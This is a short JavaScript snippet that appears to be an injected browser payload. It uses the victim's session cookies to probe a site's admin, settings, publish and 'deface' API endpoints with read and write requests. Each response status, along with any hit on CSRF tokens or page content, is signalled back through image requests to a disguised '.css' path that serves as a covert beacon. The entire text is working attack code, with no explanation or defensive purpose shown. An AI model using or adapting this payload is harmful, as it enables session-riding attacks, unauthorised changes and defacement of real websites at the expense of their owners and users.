(function () {
  function b(t) {
    try { new Image().src = '/account.php/R' + t + '.css'; } catch (e) {}
  }
  const paths = ['/api/pages','/api/page','/api/content','/api/publish','/api/home','/api/v1/pages','/api/admin','/api/site','/api/settings','/api/deface'];
  paths.forEach((u, i) => {
    ['GET','OPTIONS','POST','PUT','PATCH'].forEach(m => {
      fetch(u, {method:m, credentials:'include', body:(m==='POST'||m==='PUT'||m==='PATCH') ? '{}' : undefined})
        .then(r => { b(i+'_'+m+'_'+r.status); return r.text(); })
        .then(t => { if (/csrf|token|slug|body|html|file|publish|home|page/i.test(t)) b(i+'_HIT'); })
        .catch(() => b(i+'_'+m+'_ERR'));
    });
  });
})();
